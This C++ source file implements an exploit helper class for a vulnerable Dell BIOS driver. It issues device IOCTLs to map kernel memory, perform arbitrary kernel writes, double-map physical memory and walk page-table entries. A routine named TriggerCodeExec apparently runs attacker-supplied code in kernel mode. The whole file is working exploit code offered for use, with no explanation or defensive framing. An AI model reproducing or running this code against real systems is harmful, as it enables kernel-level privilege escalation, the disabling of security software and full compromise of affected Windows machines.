#include "DellBiosUtil.h"

bool DellBiosUtil::MapKernelMemory(size_t NumberOfBytes, PUINT64 Mapped)
{
	pKernelMapping = new ARBITRARY_KERNEL_MAPPING;

	pKernelMapping->NumberOfBytes = NumberOfBytes;
	pKernelMapping->HighestAcceptableAddress = MAXULONGLONG;

	bool bStatus = sendDeviceIoControl(
		ARBITRARY_MAP_KERNEL_SPACE,
		pKernelMapping,
		sizeof(ARBITRARY_KERNEL_MAPPING),
		pKernelMapping,
		sizeof(ARBITRARY_KERNEL_MAPPING)
	);
	if (!bStatus)
	{
		wsprintf(e, L"[%ws::%d] %ws", __FUNCTIONW__, __LINE__, dellGle());
	}

	*Mapped = pKernelMapping->AllocatedKernelMemory;

	delete pKernelMapping;
	return bStatus;
}

bool DellBiosUtil::DoubleMap(UINT64 PhysicalAddress, UINT8* DataToCopy, UINT32 CopySize)
{
	pDoubleMapping = new ARBITRARY_DOUBLE_MAPPING;

	pDoubleMapping->PhysicalAddress = PhysicalAddress;
	RtlCopyMemory(pDoubleMapping->Data, DataToCopy, CopySize);

	bool bStatus = sendDeviceIoControl(
		ARBITRARY_MAPPING,
		pDoubleMapping,
		CopySize + 0x10,
		pDoubleMapping,
		CopySize + 0x10
	);
	if (!bStatus)
	{
		wsprintf(e, L"[%ws::%d] %ws", __FUNCTIONW__, __LINE__, dellGle());
	}

	delete pDoubleMapping;
	return bStatus;
}

bool DellBiosUtil::KernelMemcpy(UINT8* CopyWhat, UINT64 CopyWhere, UINT32 CopySize)
{
	pKernelMemcpy = new ARBITRARY_KERNEL_MEMCPY;

	RtlSecureZeroMemory(pKernelMemcpy, sizeof(ARBITRARY_KERNEL_MEMCPY));

	RtlCopyMemory(pKernelMemcpy->WriteWhat, CopyWhat, CopySize);

	pKernelMemcpy->WriteWhere = CopyWhere;
	pKernelMemcpy->NumberOfBytes = 0x18 + CopySize;

	bool bStatus = sendDeviceIoControl(
		ARBITRARY_WRITE,
		pKernelMemcpy,
		sizeof(ARBITRARY_KERNEL_MEMCPY),
		pKernelMemcpy,
		sizeof(ARBITRARY_KERNEL_MEMCPY)
	);
	if (!bStatus)
	{
		wsprintf(e, L"[%ws::%d] %ws", __FUNCTIONW__, __LINE__, dellGle());
	}

	delete pKernelMemcpy;
	return bStatus;
}

PFILL_PTE_HIERARCHY DellBiosUtil::MiFillPteHierarchy(UINT64 VirtualAddress, UINT64 PteBase)
{
	pPteHierarchy = new FILL_PTE_HIERARCHY;

	///
	/// Resolve the PTE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	pPteHierarchy->PTE = VirtualAddress;

	///
	/// Resolve the PDE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	pPteHierarchy->PDE = VirtualAddress;

	///
	/// Resolve the PPE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	pPteHierarchy->PPE = VirtualAddress;

	///
	/// Resolve the PXE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	pPteHierarchy->PXE = VirtualAddress;

	return pPteHierarchy;
}

bool DellBiosUtil::isValidPte(UINT64 Source, UINT64 Pte)
{
	UINT64 SourceContents = 0;
	UINT64 PteContents = 0;
	
	if (!Read(Source, &SourceContents))
	{
		return false;
	}

	if (!Read(Pte, &PteContents))
	{
		return false;
	}

	if (SourceContents == PteContents)
	{
		return false;
	}

	return true;
}

UINT64 DellBiosUtil::VirtualToPhysical(UINT64 VirtualAddress, UINT64 index)
{
	VirtualAddress &= 0xfff;

	return (index << 12) + VirtualAddress;
}

void DellBiosUtil::TriggerCodeExec()
{
	bool bStatus = sendDeviceIoControl(
		TRIGGER_CODE_EXEC,
		pKernelMemcpy,
		sizeof(ARBITRARY_KERNEL_MEMCPY),
		pKernelMemcpy,
		sizeof(ARBITRARY_KERNEL_MEMCPY)
	);
	if (!bStatus)
	{
		wsprintf(e, L"[%ws::%d] %ws", __FUNCTIONW__, __LINE__, dellGle());
	}
}


/// EOF